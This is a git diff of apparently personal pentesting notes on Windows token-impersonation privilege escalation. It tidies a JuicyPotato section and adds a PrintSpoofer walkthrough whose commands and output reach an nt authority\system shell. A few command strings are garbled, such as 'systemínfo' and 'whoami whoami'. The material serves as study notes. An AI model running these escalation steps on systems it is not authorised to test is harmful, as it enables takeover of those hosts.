@@ -10,7 +10,7 @@ show_image_post: false                                    # Change this to true
 ---
 ### JuicyPotato
 
-The tool takes advantage of the **_SeImpersonatePrivilege_** or **_SeAssignPrimaryTokenPrivilege_** if enabled on the machine to elevate the local privileges to System. Normally, these privileges are assigned to service users, admins, and local systems — high integrity elevated users. ^80958f
+The tool takes advantage of the **_SeImpersonatePrivilege_** or **_SeAssignPrimaryTokenPrivilege_** if enabled on the machine to elevate the local privileges to System. Normally, these privileges are assigned to service users, admins, and local systems — high integrity elevated users.
 
 There are few requirements needed for Juicy Potato to work:
 
@@ -40,15 +40,10 @@ To run the tool, we need a port number for the COM server and a valid CLSID — 
 
 ```powershell
 New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
-
 $CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}} | where-object {$_.appid -ne $null}
-
 foreach($a in $CLSID)
-
 {
-
 Write-Host $a.CLSID
-
 }
 ```
 
@@ -244,5 +239,28 @@ Microsoft Windows [Version 10.0.17763.1821]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
 c:\windows\system32\inetsrv>whoami
+nt authority\system
+```
+
+### PrintSpoofer
+
+If we identify that a server is a Windows Server 2019:
+```cmd
+C:\Users\Administrator\Desktop> systemínfo
+Host Name: QUERIER
+OS Name: Microsoft Windows Server 2019 Standard
+OS Version: 10.0.17763 N/A Build 17763
+```
+
+And has SeImpersonatePrivilege, we can abuse of [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) to escalate privileges:
+```powershell
+C:\Windows\Temp\privesc> PrintSpoofer64.exe -i -c cmd
+PrintSpoofer64.exe -i -c cmd
+[+] Found privilege: SelmpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.17763.292]
+(c) 2018 Microsoft Corporation. All rights reserved.
+C:\Windows\system32>whoami whoami
 nt authority\system
 ```
